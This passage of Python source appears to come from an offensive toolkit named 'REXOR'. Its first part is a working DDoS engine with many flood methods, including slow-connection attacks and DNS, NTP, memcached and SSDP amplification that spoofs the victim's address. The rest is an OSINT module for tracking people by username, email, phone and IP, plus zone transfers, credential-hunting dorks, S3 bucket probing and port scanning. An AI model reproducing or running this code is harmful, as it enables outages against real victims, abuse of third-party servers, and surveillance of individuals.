                    f"Content-Length: {cl}\r\n"
                    f"Connection: keep-alive\r\n\r\n".encode()
                )
                self.stats.add_packet()
                self._add_socket(s)
                while self.running:
                    try:
                        s.send(self._gen_payload(random.randint(1, 10)))
                        self.stats.add_packet(10)
                        time.sleep(random.uniform(5, 15))
                    except Exception:
                        break
            except Exception:
                self.stats.add_error()

    def _ws_flood(self, ip, port, path, use_ssl=False):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port))
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=ip)
                key = base64.b64encode(os.urandom(16)).decode()
                handshake = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {key}\r\n"
                    f"Sec-WebSocket-Version: 13\r\n"
                    f"User-Agent: {self._ws_ua}\r\n\r\n"
                )
                s.send(handshake.encode())
                self.stats.add_packet(len(handshake))
                self._add_socket(s)
                self._record_talker(ip)
            except Exception:
                self.stats.add_error()

    def _connection_reuse_flood(self, ip, port, size):
        pool = []
        while self.running:
            try:
                while len(pool) < 50:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.settimeout(1)
                    try:
                        s.connect((ip, port))
                        pool.append(s)
                        self._add_socket(s)
                    except Exception:
                        break
                if not pool:
                    continue
                s = random.choice(pool)
                try:
                    s.send(self._gen_payload(size))
                    self.stats.add_packet(size)
                except Exception:
                    pool.remove(s)
            except Exception:
                self.stats.add_error()

    def _tls_renegotiation_flood(self, ip, port):
        while self.running:
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = socket.create_connection((ip, port), timeout=3)
                ss = ctx.wrap_socket(s, server_hostname=ip)
                for _ in range(random.randint(3, 10)):
                    if not self.running:
                        break
                    try:
                        ss.renegotiate()
                    except AttributeError:
                        ss = ctx.wrap_socket(socket.create_connection((ip, port), timeout=3), server_hostname=ip)
                    except Exception:
                        break
                    self.stats.add_packet(64)
                ss.close()
            except Exception:
                self.stats.add_error()

    def _subdomain_spray_flood(self, ip, port, domain, use_ssl=False):
        subs = ["www", "api", "cdn", "static", "assets", "img", "media", "files", "app", "m", "beta", "staging", "test", "dev", "docs", "support", "help", "admin", "login", "auth"]
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=ip)
                sub = random.choice(subs)
                payload = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {sub}.{domain}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(payload.encode())
                self.stats.add_packet(len(payload))
                self._add_socket(s)
            except Exception:
                self.stats.add_error()

    def _dns_amp_flood(self, victim_ip, dns_server, query):
        if not SCAPY_AVAILABLE:
            self.stats.add_error()
            return
        try:
            qname = b"".join(struct.pack("B", len(p)) + p.encode() for p in query.split(".")) + b"\x00"
        except Exception:
            qname = b"\x06google\x03com\x00"
        while self.running:
            try:
                tid = random.randint(0, 65535)
                dns_payload = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + qname + struct.pack("!HH", 255, 1)
                pkt = IP(src=victim_ip, dst=dns_server) / UDP(sport=random.randint(1024, 65535), dport=53) / Raw(load=dns_payload)
                send(pkt, verbose=False)
                self.stats.add_packet(len(dns_payload))
                self._jitter()
            except Exception:
                self.stats.add_error()

    def _ntp_amp_flood(self, victim_ip, ntp_server):
        if not SCAPY_AVAILABLE:
            self.stats.add_error()
            return
        payload = b"\x17\x00\x03\x2a" + b"\x00" * 44
        while self.running:
            try:
                pkt = IP(src=victim_ip, dst=ntp_server) / UDP(sport=random.randint(1024, 65535), dport=123) / Raw(load=payload)
                send(pkt, verbose=False)
                self.stats.add_packet(len(payload))
                self._jitter()
            except Exception:
                self.stats.add_error()

    def _memcached_amp_flood(self, victim_ip, mem_server):
        if not SCAPY_AVAILABLE:
            self.stats.add_error()
            return
        payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
        while self.running:
            try:
                pkt = IP(src=victim_ip, dst=mem_server) / UDP(sport=random.randint(1024, 65535), dport=11211) / Raw(load=payload)
                send(pkt, verbose=False)
                self.stats.add_packet(len(payload))
                self._jitter()
            except Exception:
                self.stats.add_error()

    def _ssdp_amp_flood(self, victim_ip, target):
        if not SCAPY_AVAILABLE:
            self.stats.add_error()
            return
        payload = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'
        while self.running:
            try:
                pkt = IP(src=victim_ip, dst=target) / UDP(sport=random.randint(1024, 65535), dport=1900) / Raw(load=payload)
                send(pkt, verbose=False)
                self.stats.add_packet(len(payload))
                self._jitter()
            except Exception:
                self.stats.add_error()

    def _connection_exhaust(self, ip, port):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((ip, port))
                self._add_socket(s)
                self.stats.add_packet()
                self._record_talker(ip)
            except Exception:
                self.stats.add_error()

    def _bandwidth_flood(self, ip, port, size):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        try:
            s.connect((ip, port))
        except Exception:
            return
        while self.running:
            try:
                s.send(self._gen_payload(size))
                self.stats.add_packet(size)
            except Exception:
                break

    def _build_table(self):
        elapsed = self.stats.get_elapsed()
        pps = self.stats.get_pps()
        mbps = self.stats.get_mbps()
        table = Table(
            show_header=True,
            header_style="bold red",
            border_style="red",
            box=box.HEAVY,
            title="REXOR FLOODS - LIVE",
            title_style="bold red",
        )
        table.add_column("METRIC", style="red")
        table.add_column("VALUE", style="red")
        table.add_row("Method", f"[bold red]{self.stats.method}[/bold red]")
        table.add_row("Packets", f"[bold red]{self.stats.packets:,}[/bold red]")
        table.add_row("Data", f"[bold red]{self.stats.bytes / 1024 / 1024:.2f} MB[/bold red]")
        table.add_row("Errors", f"[bold red]{self.stats.errors:,}[/bold red]")
        table.add_row("Elapsed", f"[bold red]{elapsed:.1f}s[/bold red]")
        table.add_row("PPS", f"[bold red]{pps:,.1f}[/bold red]")
        table.add_row("Throughput", f"[bold red]{mbps:.2f} Mbps[/bold red]")
        table.add_row("Sockets", f"[bold red]{len(self.sock_list)}[/bold red]")
        if self.proxy_manager and self.proxy_manager.pool:
            s = self.proxy_manager.stats()
            table.add_row("Proxies", f"[bold red]{s['available']}/{s['total']}[/bold red]")
        with self.talkers_lock:
            top = sorted(self.top_talkers.items(), key=lambda x: x[1], reverse=True)[:3]
        for i, (ip, cnt) in enumerate(top, 1):
            table.add_row(f"Talker {i}", f"[bold red]{ip} ({cnt})[/bold red]")
        return table

    def stop(self):
        self.running = False
        self._cleanup_sockets()

    def dry_run(self, method, ip, port=80):
        try:
            resolved = socket.gethostbyname(ip)
        except Exception:
            resolved = ip
        if method in self.DEAD_METHODS:
            ce.print(f"[!] {method.upper()} is a dead protocol - patched out of modern kernels")
            return False
        ce.print(f"Target: {resolved}:{port}")
        ce.print(f"Method: {method.upper()}")
        ce.print(f"Sockets: {self.config.get('sockets')}")
        ce.print(f"scapy available: {SCAPY_AVAILABLE}")
        if method in {"syn", "ack", "fin", "rst", "xmas", "icmp", "dnsamp", "ntpamp", "memamp", "ssdp", "gre", "udpfrag"} and not SCAPY_AVAILABLE:
            ce.print(f"[!] {method.upper()} needs scapy for full effect")
        return True

    def ddos(self, method, ip, port=80, threads=100, sockets=50, size=1024,
             path="/", use_ssl=False, extra="", victim="", domain="", dry_run=False):
        if method in self.DEAD_METHODS:
            ce.print(f"[!] {method.upper()} is disabled - protocol dead since the 90s")
            return False
        methods_map = {
            "tcp": lambda: self._tcp_flood(ip, port, size),
            "udp": lambda: self._udp_flood(ip, port, size),
            "udpfrag": lambda: self._udp_fragment_flood(ip, port, size),
            "gre": lambda: self._gre_flood(ip, size),
            "syn": lambda: self._syn_flood(ip, port, size),
            "ack": lambda: self._ack_flood(ip, port, size),
            "fin": lambda: self._fin_flood(ip, port, size),
            "rst": lambda: self._rst_flood(ip, port, size),
            "xmas": lambda: self._xmas_flood(ip, port, size),
            "http": lambda: self._http_flood(ip, port, path, use_ssl),
            "https": lambda: self._https_flood(ip, port, path),
            "range": lambda: self._range_header_flood(ip, port, path, use_ssl),
            "slowread": lambda: self._slow_read_flood(ip, port, path, use_ssl),
            "icmp": lambda: self._icmp_flood(ip, size),
            "loris": lambda: self._loris_flood(ip, port),
            "rudy": lambda: self._rudy_flood(ip, port, path),
            "ws": lambda: self._ws_flood(ip, port, path, use_ssl),
            "reuse": lambda: self._connection_reuse_flood(ip, port, size),
            "tlsreneg": lambda: self._tls_renegotiation_flood(ip, port),
            "subspray": lambda: self._subdomain_spray_flood(ip, port, domain or ip, use_ssl),
            "dnsamp": lambda: self._dns_amp_flood(victim or ip, extra or "8.8.8.8", "google.com"),
            "ntpamp": lambda: self._ntp_amp_flood(victim or ip, extra or "pool.ntp.org"),
            "memamp": lambda: self._memcached_amp_flood(victim or ip, extra or "127.0.0.1"),
            "ssdp": lambda: self._ssdp_amp_flood(victim or ip, extra or "239.255.255.250"),
            "connexhaust": lambda: self._connection_exhaust(ip, port),
            "bandwidth": lambda: self._bandwidth_flood(ip, port, size),
        }
        if method not in methods_map:
            ce.print("Invalid method")
            return False
        if dry_run:
            return self.dry_run(method, ip, port)
        self.stop()
        self.running = True
        self.stats.reset(method)
        self.reaper = threading.Thread(target=self._reap, daemon=True)
        self.reaper.start()
        for _ in range(sockets):
            threading.Thread(target=methods_map[method], daemon=True).start()
        try:
            with Live(self._build_table(), console=ce, refresh_per_second=4, screen=False) as live:
                while self.running:
                    live.update(self._build_table())
                    time.sleep(0.25)
        except KeyboardInterrupt:
            self.stop()
            ce.print("\n[!] STOPPED")
        return True


class RexorOSINT:
    def __init__(self, proxy_manager=None, config=None):
        self.proxy_manager = proxy_manager
        self.config = config or Config()
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=Retry(total=2, backoff_factor=0.3))
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        self._session_lock = threading.Lock()
        self._last_request_per_host = defaultdict(float)

    def close(self):
        try:
            self.session.close()
        except Exception:
            pass

    def _throttle(self, url):
        try:
            host = urllib.parse.urlparse(url).hostname or ""
        except Exception:
            return
        jitter = self.config.get("jitter_ms") / 1000.0
        now = time.time()
        with self._session_lock:
            last = self._last_request_per_host.get(host, 0)
            wait = max(0, jitter - (now - last))
            if wait > 0:
                time.sleep(wait)
            self._last_request_per_host[host] = time.time()

    def _request(self, method, url, **kwargs):
        self._throttle(url)
        proxy = self.proxy_manager.get() if self.proxy_manager else None
        kwargs.setdefault("timeout", self.config.get("timeout"))
        kwargs.setdefault("allow_redirects", True)
        if proxy:
            kwargs["proxies"] = {"http": proxy, "https": proxy}
        start = time.time()
        try:
            resp = self.session.request(method, url, **kwargs)
            if proxy:
                self.proxy_manager.mark_result(proxy, True, time.time() - start)
            return resp
        except Exception as e:
            if proxy:
                self.proxy_manager.mark_result(proxy, False)
            log.write(f"request fail {url}: {e}")
            raise

    def _check_profile(self, platform, url):
        try:
            resp = self._request("GET", url, headers={"User-Agent": random.choice(USER_AGENTS)}, stream=True)
            snippet = ""
            try:
                chunk = resp.raw.read(65536, decode_content=True)
                snippet = chunk.decode("utf-8", errors="ignore")
            except Exception:
                snippet = resp.text[:65536]
            resp.close()
            if resp.status_code == 200:
                content = snippet.lower()
                if platform in PLATFORM_FINGERPRINTS:
                    for fp in PLATFORM_FINGERPRINTS[platform]:
                        if fp.lower() in content:
                            return (platform, False, url)
                    return (platform, True, url)
                if len(snippet) < 1000:
                    if any(p in content for p in ("not found", "doesn't exist", "page not found", "404", "couldn't find", "sorry")):
                        return (platform, False, url)
                return (platform, True, url)
            return (platform, False, url)
        except Exception:
            return (platform, False, url)

    def _save_result(self, name, data):
        try:
            path = RESULTS_DIR / f"{name}_{int(time.time())}.json"
            path.write_text(json.dumps(data, indent=2, default=str))
            return path
        except Exception:
            return None

    def username_search(self, username, return_data=False):
        ce.print(f"\nUsername search: {username}")
        found = []
        total = len(PLATFORMS)
        completed = 0
        with Progress(
            SpinnerColumn(),
            TextColumn("{task.description}"),
            BarColumn(bar_width=40, style="red", complete_style="bold red"),
            TextColumn("{task.completed}/{task.total}"),
            console=ce,
        ) as progress:
            task = progress.add_task("Scanning platforms...", total=total)
            with ThreadPoolExecutor(max_workers=30) as executor:
                futures = {}
                for platform, url_template in PLATFORMS.items():
                    url = url_template.format(username)
                    futures[executor.submit(self._check_profile, platform, url)] = platform
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        found.append(result)
                    completed += 1
                    progress.update(task, completed=completed)
        ce.print("")
        table = Table(title="Username search results", border_style="red", box=box.HEAVY, show_lines=True)
        table.add_column("PLATFORM", style="red", no_wrap=True)
        table.add_column("STATUS", style="red", justify="center")
        table.add_column("PROFILE URL", style="red")
        found_count = 0
        for platform, exists, url in found:
            if exists:
                status = "[bold green]FOUND[/bold green]"
                found_count += 1
            else:
                status = "[dim red]NOT FOUND[/dim red]"
            table.add_row(f"{platform.title()}", status, f"{url}")
        ce.print(table)
        ce.print(f"\nFound on {found_count}/{total} platforms")
        if found_count > 0:
            ce.print(f"\nProfiles:")
            for platform, exists, url in found:
                if exists:
                    ce.print(f"  [bold green]{platform.title()}[/bold green]: {url}")
        else:
            ce.print(f"\n[!] No profiles found for '{username}'")
        if return_data:
            return [{"platform": p, "url": u} for p, e, u in found if e]
        return None

    def email_osint(self, email):
        ce.print(f"\nEmail OSINT: {email}")
        if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
            ce.print("[!] Not a valid email")
            return
        username, domain = email.split("@")[0], email.split("@")[1]
        ce.print(f"Username part: {username}")
        ce.print(f"Domain: {domain}")
        ce.print(f"\nMX records:")
        if DNS_AVAILABLE:
            try:
                answers = dns.resolver.resolve(domain, "MX")
                for rdata in answers:
                    ce.print(f"  {rdata.exchange} (priority: {rdata.preference})")
            except Exception:
                ce.print("  Could not resolve MX")
        else:
            ce.print("  dnspython not installed (pip install dnspython)")
        ce.print(f"\nSPF / DMARC / DKIM:")
        for record_name, record_type in [("TXT", domain), ("TXT", f"_dmarc.{domain}")]:
            try:
                answers = dns.resolver.resolve(record_type, "TXT")
                for rdata in answers:
                    txt = rdata.to_text().strip('"')
                    if "v=spf" in txt or "v=DMARC" in txt:
                        ce.print(f"  {record_name}: {txt[:200]}")
            except Exception:
                pass
        ce.print(f"\nData breaches (HIBP):")
        key = self.config.get("hibp_api_key")
        if key:
            try:
                resp = self._request(
                    "GET",
                    f"https://haveibeenpwned.com/api/v3/breachedaccount/{urllib.parse.quote(email)}",
                    headers={"hibp-api-key": key, "User-Agent": "Rexor"},
                )
                if resp.status_code == 200:
                    breaches = resp.json()
                    ce.print(f"  Found in {len(breaches)} breach(es):")
                    for b in breaches[:15]:
                        ce.print(f"  {b['Name']} ({b['BreachDate']})")
                elif resp.status_code == 404:
                    ce.print("  No breaches found")
                elif resp.status_code == 401:
                    ce.print("  HIBP API key rejected")
                else:
                    ce.print(f"  API status {resp.status_code}")
            except Exception:
                ce.print("  Could not check breaches")
        else:
            ce.print("  Add hibp_api_key to ~/.rexor/config.toml")
        gravatar_hash = hashlib.md5(email.lower().strip().encode()).hexdigest()
        ce.print(f"\nGravatar: https://www.gravatar.com/avatar/{gravatar_hash}?s=200")
        ce.print(f"\nSearching social media with email username...")
        self.username_search(username)

    def phone_osint(self, phone):
        ce.print(f"\nPhone OSINT: {phone}")
        cleaned = re.sub(r"[\s\-\(\)\+\.]", "", phone)
        ce.print(f"Cleaned: {cleaned}")
        ce.print(f"Digits: {len(cleaned)}")
        if len(cleaned) >= 10:
            cc = cleaned[:-10] if len(cleaned) > 10 else "1"
            local = cleaned[-10:]
            ce.print(f"Country code: +{cc}")
            ce.print(f"Local: {local}")
            ce.print(f"\nFormats:")
            ce.print(f"  International: +{cc} {local[:3]} {local[3:6]} {local[6:]}")
            ce.print(f"  National: ({local[:3]}) {local[3:6]}-{local[6:]}")
            ce.print(f"  E.164: +{cc}{local}")
        ce.print(f"\nSearching social media with number...")
        self.username_search(cleaned)

    def ip_geolocation(self, ip):
        ce.print(f"\nIP geolocation: {ip}")
        try:
            resp = self._request(
                "GET",
                f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
            )
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "success":
                    table = Table(title="IP geolocation", border_style="red", box=box.HEAVY, show_lines=True)
                    table.add_column("FIELD", style="red", no_wrap=True)
                    table.add_column("VALUE", style="red")
                    for label, key in [
                        ("Country", "country"), ("Country Code", "countryCode"),
                        ("Region", "regionName"), ("City", "city"), ("ZIP/Postal", "zip"),
                        ("Latitude", "lat"), ("Longitude", "lon"), ("Timezone", "timezone"),
                        ("ISP", "isp"), ("Organization", "org"), ("AS Number", "as"),
                        ("AS Name", "asname"), ("Reverse DNS", "reverse"),
                        ("Mobile Network", "mobile"), ("Proxy/VPN", "proxy"),
                        ("Hosting/DC", "hosting"), ("IP", "query"),
                    ]:
                        val = data.get(key, "N/A")
                        if val == "" or val is None:
                            val = "N/A"
                        table.add_row(f"{label}", f"{val}")
                    ce.print(table)
                    lat, lon = data.get("lat"), data.get("lon")
                    if lat and lon:
                        ce.print(f"\nGoogle Maps: https://www.google.com/maps?q={lat},{lon}")
                        ce.print(f"OpenStreetMap: https://www.openstreetmap.org/?mlat={lat}&mlon={lon}&zoom=12")
                    return
        except Exception as e:
            ce.print(f"[!] ip-api lookup failed: {e}")
        try:
            resp = self._request("GET", f"https://ipapi.co/{ip}/json/")
            if resp.status_code == 200:
                data = resp.json()
                if not data.get("error"):
                    ce.print(f"Country: {data.get('country_name','N/A')}")
                    ce.print(f"Region: {data.get('region','N/A')}")
                    ce.print(f"City: {data.get('city','N/A')}")
                    ce.print(f"ISP: {data.get('org','N/A')}")
        except Exception:
            pass

    def asn_lookup(self, query):
        ce.print(f"\nASN lookup: {query}")
        try:
            resp = self._request("GET", f"https://api.bgpview.io/search?query_term={urllib.parse.quote(query)}")
            if resp.status_code == 200:
                data = resp.json().get("data", {})
                asns = data.get("asns", [])
                if asns:
                    table = Table(title="ASNs", border_style="red", box=box.HEAVY, show_lines=True)
                    table.add_column("ASN", style="red")
                    table.add_column("NAME", style="red")
                    table.add_column("COUNTRY", style="red")
                    table.add_column("DESC", style="red")
                    for a in asns[:20]:
                        table.add_row(
                            f"AS{a.get('asn','')}",
                            a.get("name", ""),
                            a.get("country_code", ""),
                            (a.get("description", "") or "")[:60],
                        )
                    ce.print(table)
                prefixes = data.get("ipv4_prefixes", [])
                if prefixes:
                    ce.print(f"\nIPv4 prefixes ({len(prefixes)}):")
                    for p in prefixes[:20]:
                        ce.print(f"  {p.get('prefix','')}  {p.get('name','')}")
        except Exception as e:
            ce.print(f"[!] ASN lookup failed: {e}")

    def dns_zone_transfer(self, domain):
        ce.print(f"\nDNS zone transfer attempt: {domain}")
        if not DNS_AVAILABLE:
            ce.print("[!] dnspython not installed")
            return
        try:
            ns_answers = dns.resolver.resolve(domain, "NS")
            nameservers = [str(r).strip(".") for r in ns_answers]
            ce.print(f"Nameservers: {', '.join(nameservers)}")
            for ns in nameservers:
                try:
                    ip = socket.gethostbyname(ns)
                    z = dns.zone.from_xfr(dns.query.xfr(ip, domain, timeout=10))
                    names = z.nodes.keys()
                    ce.print(f"[bold green]  AXFR SUCCESS on {ns} ({ip}) - {len(names)} records[/bold green]")
                    for n in list(names)[:50]:
                        ce.print(f"    {n}")
                except Exception:
                    ce.print(f"  {ns}: AXFR refused")
        except Exception as e:
            ce.print(f"[!] Zone transfer failed: {e}")

    def security_txt(self, domain):
        ce.print(f"\nsecurity.txt: {domain}")
        for path in ("/.well-known/security.txt", "/security.txt"):
            url = f"https://{domain}{path}"
            try:
                resp = self._request("GET", url)
                if resp.status_code == 200 and resp.text.strip():
                    ce.print(f"\n[bold green]Found at {url}[/bold green]")
                    ce.print(resp.text[:2000])
                    return
            except Exception:
                pass
        ce.print("Not found")

    def github_user(self, username):
        ce.print(f"\nGitHub user: {username}")
        try:
            resp = self._request("GET", f"https://api.github.com/users/{username}")
            if resp.status_code == 200:
                u = resp.json()
                table = Table(title=f"GitHub: {username}", border_style="red", box=box.HEAVY)
                table.add_column("FIELD", style="red")
                table.add_column("VALUE", style="red")
                for label, key in [
                    ("Name", "name"), ("Company", "company"), ("Blog", "blog"),
                    ("Location", "location"), ("Email", "email"), ("Bio", "bio"),
                    ("Public Repos", "public_repos"), ("Public Gists", "public_gists"),
                    ("Followers", "followers"), ("Following", "following"),
                    ("Created", "created_at"), ("Updated", "updated_at"),
                ]:
                    val = u.get(key, "N/A")
                    if not val:
                        val = "N/A"
                    table.add_row(f"{label}", f"{str(val)[:80]}")
                ce.print(table)
                try:
                    repos = self._request("GET", f"https://api.github.com/users/{username}/repos?per_page=100&sort=updated").json()
                    if isinstance(repos, list) and repos:
                        ce.print(f"\nTop repos ({len(repos)}):")
                        for r in repos[:20]:
                            ce.print(f"  {r.get('name','')} - {r.get('language','')} - {r.get('stargazers_count',0)} stars")
                except Exception:
                    pass
            elif resp.status_code == 404:
                ce.print("[!] User not found")
            else:
                ce.print(f"[!] GitHub API status {resp.status_code}")
        except Exception as e:
            ce.print(f"[!] GitHub lookup failed: {e}")

    def urlscan_lookup(self, target):
        ce.print(f"\nURLScan.io lookup: {target}")
        try:
            resp = self._request("GET", f"https://urlscan.io/api/v1/search/?q=domain:{urllib.parse.quote(target)}")
            if resp.status_code == 200:
                results = resp.json().get("results", [])
                if results:
                    table = Table(title="URLScan results", border_style="red", box=box.HEAVY, show_lines=True)
                    table.add_column("TIME", style="red")
                    table.add_column("URL", style="red")
                    table.add_column("IP", style="red")
                    table.add_column("SERVER", style="red")
                    for r in results[:15]:
                        table.add_row(
                            (r.get("task", {}).get("time", "") or "")[:19],
                            (r.get("page", {}).get("url", "") or "")[:60],
                            r.get("page", {}).get("ip", ""),
                            (r.get("page", {}).get("server", "") or "")[:25],
                        )
                    ce.print(table)
                else:
                    ce.print("No results")
        except Exception as e:
            ce.print(f"[!] URLScan failed: {e}")

    def virustotal_lookup(self, target):
        ce.print(f"\nVirusTotal lookup: {target}")
        key = self.config.get("virustotal_api_key")
        if not key:
            ce.print("[!] Add virustotal_api_key to ~/.rexor/config.toml")
            return
        target_type = "domains" if "." in target and not target.replace(".", "").isdigit() else "ip_addresses"
        try:
            resp = self._request("GET", f"https://www.virustotal.com/api/v3/{target_type}/{target}",
                                 headers={"x-apikey": key})
            if resp.status_code == 200:
                data = resp.json().get("data", {}).get("attributes", {})
                stats = data.get("last_analysis_stats", {})
                ce.print(f"Malicious: {stats.get('malicious', 0)}")
                ce.print(f"Suspicious: {stats.get('suspicious', 0)}")
                ce.print(f"Harmless: {stats.get('harmless', 0)}")
                ce.print(f"Undetected: {stats.get('undetected', 0)}")
                for k in ("reputation", "country", "as_owner", "registrar"):
                    if data.get(k):
                        ce.print(f"{k}: {data[k]}")
            else:
                ce.print(f"[!] VT status {resp.status_code}")
        except Exception as e:
            ce.print(f"[!] VT lookup failed: {e}")

    def shodan_lookup(self, target):
        ce.print(f"\nShodan lookup: {target}")
        key = self.config.get("shodan_api_key")
        if not key:
            ce.print("[!] Add shodan_api_key to ~/.rexor/config.toml")
            return
        try:
            resp = self._request("GET", f"https://api.shodan.io/shodan/host/{target}?key={key}")
            if resp.status_code == 200:
                data = resp.json()
                for label, key_name in [
                    ("IP", "ip_str"), ("Org", "org"), ("ISP", "isp"),
                    ("OS", "os"), ("Country", "country_name"),
                    ("City", "city"), ("Last Update", "last_update"),
                ]:
                    ce.print(f"{label}: {data.get(key_name, 'N/A')}")
                for port in data.get("ports", []):
                    ce.print(f"Open port: {port}")
                for item in data.get("data", [])[:10]:
                    ce.print(f"\n  Port {item.get('port')}: {(item.get('banner') or '')[:200]}")
            else:
                ce.print(f"[!] Shodan status {resp.status_code}")
        except Exception as e:
            ce.print(f"[!] Shodan failed: {e}")

    def google_dorks(self, domain):
        ce.print(f"\nGoogle dorks for: {domain}")
        dorks = [
            f'site:{domain}',
            f'site:{domain} filetype:pdf',
            f'site:{domain} filetype:xls OR filetype:xlsx',
            f'site:{domain} filetype:doc OR filetype:docx',
            f'site:{domain} inurl:admin',
            f'site:{domain} inurl:login',
            f'site:{domain} intitle:index.of',
            f'site:{domain} ext:sql',
            f'site:{domain} ext:env',
            f'site:{domain} "password"',
            f'site:{domain} "api_key"',
            f'site:{domain} inurl:phpmyadmin',
            f'site:{domain} inurl:wp-admin',
            f'cache:{domain}',
            f'link:{domain}',
            f'related:{domain}',
            f'site:pastebin.com "{domain}"',
            f'site:github.com "{domain}"',
            f'site:trello.com "{domain}"',
            f'site:s3.amazonaws.com "{domain}"',
        ]
        for d in dorks:
            ce.print(f"  https://www.google.com/search?q={urllib.parse.quote(d)}")
        ce.print(f"\nDirect links:")
        ce.print(f"  Crtsh: https://crt.sh/?q=%25.{domain}")
        ce.print(f"  Wayback: https://web.archive.org/web/*/{domain}/*")
        ce.print(f"  Archive.today: https://archive.ph/newest/https://{domain}")
        ce.print(f"  BuiltWith: https://builtwith.com/{domain}")
        ce.print(f"  DNSDumpster: https://dnsdumpster.com/")

    def s3_bucket_check(self, bucket_name):
        ce.print(f"\nS3 bucket check: {bucket_name}")
        for region in ("us-east-1", "us-west-2", "eu-west-1"):
            url = f"https://{bucket_name}.s3.{region}.amazonaws.com/"
            try:
                resp = self._request("GET", url, timeout=5)
                if resp.status_code == 200:
                    ce.print(f"[bold green]  PUBLIC READABLE: {url}[/bold green]")
                    ce.print(f"  First 500 chars:")
                    ce.print(resp.text[:500])
                elif resp.status_code == 403:
                    ce.print(f"  Exists, access denied: {url}")
            except Exception:
                pass

    def dns_osint(self, domain):
        ce.print(f"\nDNS OSINT: {domain}")
        if not DNS_AVAILABLE:
            ce.print("[!] dnspython not installed")
            return
        record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "SRV", "CAA", "PTR", "SPF", "DNSKEY", "DS"]
        table = Table(title="DNS records", border_style="red", box=box.HEAVY, show_lines=True)
        table.add_column("TYPE", style="red", no_wrap=True)
        table.add_column("VALUE", style="red")
        for rt in record_types:
            try:
                answers = dns.resolver.resolve(domain, rt)
                for rdata in list(answers)[:5]:
                    table.add_row(rt, str(rdata)[:120])
            except Exception:
                pass
        ce.print(table)

    def reverse_dns_sweep(self, cidr):
        ce.print(f"\nReverse DNS sweep: {cidr}")
        try:
            net = ipaddress.ip_network(cidr, strict=False)
            hosts = list(net.hosts())[:256]
            with Progress(
                SpinnerColumn(),
                TextColumn("Resolving..."),
                BarColumn(bar_width=30, style="red"),
                console=ce,
            ) as progress:
                task = progress.add_task("", total=len(hosts))
                def resolve(ip):
                    try:
                        return str(ip), socket.gethostbyaddr(str(ip))[0]
                    except Exception:
                        return str(ip), None
                with ThreadPoolExecutor(max_workers=50) as ex:
                    futures = [ex.submit(resolve, ip) for ip in hosts]
                    for f in as_completed(futures):
                        ip, name = f.result()
                        if name:
                            ce.print(f"  {ip} -> {name}")
                        progress.update(task, advance=1)
        except Exception as e:
            ce.print(f"[!] Sweep failed: {e}")

    def port_scanner(self, ip, mode="common", banner_grab=True, export=None):
        if mode == "top1000":
            ports = TOP_1000_PORTS
        elif mode == "all":
            ports = list(range(1, 65536))
        else:
            ports = list(COMMON_PORTS.keys())
        ce.print(f"\nPort scan: {ip} ({len(ports)} ports, mode={mode})")
        open_ports = []
        with Progress(
            SpinnerColumn(),
            TextColumn("Scanning..."),
            BarColumn(bar_width=30, style="red"),
            TextColumn("{task.completed}/{task.total}"),
            console=ce,
        ) as progress:
            task = progress.add_task("", total=len(ports))
            with ThreadPoolExecutor(max_workers=200) as executor:
                futures = {executor.submit(self._scan_port, ip, p): p for p in ports}
                for f in as_completed(futures):
                    p = futures[f]
                    try:
                        if f.result():
                            svc = COMMON_PORTS.get(p, "Unknown")
                            open_ports.append((p, svc))
                            ce.print(f"  [bold green]{p}/tcp  {svc}  OPEN[/bold green]")
                    except Exception:
                        pass
                    progress.update(task, advance=1)
        if not open_ports:
            ce.print("No open ports found")
            return
        ce.print(f"\n{len(open_ports)} open ports")
        banners = {}
        if banner_grab:
            ce.print(f"\nBanner grab:")
            for port, svc in sorted(open_ports):
                b = self._grab_banner(ip, port)
                if b:
                    clean = b.strip().replace("\r", " ").replace("\n", " ")[:120]
                    banners[port] = clean
                    ce.print(f"  {port}: {clean}")
                    for pat, name in SERVICE_BANNER_PATTERNS:
                        m = pat.search(b)
                        if m:
                            ce.print(f"    -> detected: {name} ({m.group(1)[:40]})")
                            break
        ce.print(f"\nQuick analysis:")
        for port, svc in sorted(open_ports):
            if port in [22, 3389, 5900]:
                ce.print(f"  {port} ({svc}) - remote access, check creds")
            elif port in [80, 443, 8080, 8443]:
